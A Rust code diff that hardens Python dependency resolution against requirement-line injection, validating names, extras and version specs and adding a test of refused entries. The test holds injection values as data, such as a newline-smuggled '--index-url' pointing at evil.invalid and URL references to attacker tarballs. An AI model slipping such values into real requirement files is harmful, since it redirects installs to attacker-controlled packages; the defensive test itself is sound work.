@@ -69,7 +69,7 @@ pub async fn resolve_dependencies(
         .clone()
         .unwrap_or_else(super::default_python_version);
 
-    let resolved = compile_requirements(home, &requirement_lines(dependencies), python_version)
+    let resolved = compile_requirements(home, &requirement_lines(dependencies)?, python_version)
         .await
         .map_err(|e| e.uv_context("Failed to run UV dependency resolution"))?;
 
@@ -119,8 +119,15 @@ pub async fn resolve_combined(
             .count()
     );
 
-    let mut lines = requirement_lines(collected);
-    lines.extend(extra_requirements.iter().map(|r| r.to_string()));
+    let mut lines = requirement_lines(collected)?;
+    for requirement in extra_requirements {
+        // One requirement per entry: a line break would let one entry add
+        // another line, a pip option among them.
+        if requirement.contains(['\n', '\r']) || requirement.trim_start().starts_with('-') {
+            return Err(PythonError::InvalidRequirement(requirement.to_string()));
+        }
+        lines.push(requirement.to_string());
+    }
 
     let resolved = compile_requirements(home, &lines, python_version)
         .await
@@ -133,9 +140,25 @@ pub async fn resolve_combined(
 }
 
 /// Render the non-optional entries of `dependencies` as PEP-508 requirement
-/// lines (`name[extras]spec`).
-fn requirement_lines(dependencies: &PythonDependencies) -> Vec<String> {
-    dependencies
+/// lines (`name[extras]spec`). Every name, extra and version is checked the
+/// way a manifest checks it, so each entry renders as exactly one plain
+/// requirement, however the set was built.
+fn requirement_lines(dependencies: &PythonDependencies) -> Result<Vec<String>, PythonError> {
+    for (name, dep) in &dependencies.dependencies {
+        let valid = hpm_package::python::is_python_name(name)
+            && dep
+                .extras
+                .iter()
+                .all(|e| hpm_package::python::is_python_name(e))
+            && hpm_package::python::validate_python_version(&dep.version.spec).is_ok();
+        if !valid {
+            return Err(PythonError::InvalidRequirement(format!(
+                "{name} {} {:?}",
+                dep.version.spec, dep.extras
+            )));
+        }
+    }
+    Ok(dependencies
         .dependencies
         .iter()
         .filter(|(_, dep)| !dep.optional)
@@ -152,7 +175,7 @@ fn requirement_lines(dependencies: &PythonDependencies) -> Vec<String> {
                 format!("{}[{}]{}", name, dep.extras.join(","), version_part)
             }
         })
-        .collect()
+        .collect())
 }
 
 /// Write requirement lines to a temp requirements file, skipping blank lines.
@@ -258,7 +281,7 @@ certifi==2022.12.7";
     fn combined_requirements_include_manifest_and_extra() {
         let mut deps = PythonDependencies::new();
         deps.add_dependency(PythonDependency::new("numpy", VersionSpec::new(">=1.20")));
-        let mut lines = requirement_lines(&deps);
+        let mut lines = requirement_lines(&deps).unwrap();
         lines.extend(["PySide6>=6.6".to_string(), "  ".to_string()]);
         let tmp = write_requirements_file(&lines).unwrap();
         let content = std::fs::read_to_string(tmp.path()).unwrap();
@@ -277,7 +300,7 @@ certifi==2022.12.7";
                 .with_extras(vec!["security".to_string()]),
         );
 
-        let temp_file = write_requirements_file(&requirement_lines(&deps)).unwrap();
+        let temp_file = write_requirements_file(&requirement_lines(&deps).unwrap()).unwrap();
         let content = std::fs::read_to_string(temp_file.path()).unwrap();
 
         assert!(content.contains("numpy>=1.20"));
@@ -295,5 +318,31 @@ certifi==2022.12.7";
         let tmp = write_requirements_file(&reqs).unwrap();
         let content = std::fs::read_to_string(tmp.path()).unwrap();
         assert_eq!(content, "PySide6>=6.6\nnumpy\n");
+    }
+
+    /// However a dependency set was built, an entry that is not one plain
+    /// requirement is refused rather than rendered into extra lines.
+    #[test]
+    fn an_injected_entry_is_refused_not_rendered() {
+        for (name, spec, extras) in [
+            (
+                "numpy",
+                ">=1\n--index-url https://evil.invalid/simple",
+                vec![],
+            ),
+            ("numpy", "@ https://evil.invalid/n.tar.gz", vec![]),
+            ("x @ https://evil.invalid/x.tar.gz", "*", vec![]),
+            ("requests", ">=2", vec!["socks]\n-e x".to_string()]),
+            // A space-separated token starting with `-` is a per-requirement
+            // option to pip and uv.
+            ("numpy", ">=1 --config-settings=editable=x", vec![]),
+            ("numpy", ">=1,-e", vec![]),
+        ] {
+            let mut deps = PythonDependencies::new();
+            deps.add_dependency(
+                PythonDependency::new(name, VersionSpec::new(spec)).with_extras(extras),
+            );
+            assert!(requirement_lines(&deps).is_err(), "{name} {spec}");
+        }
     }
 }
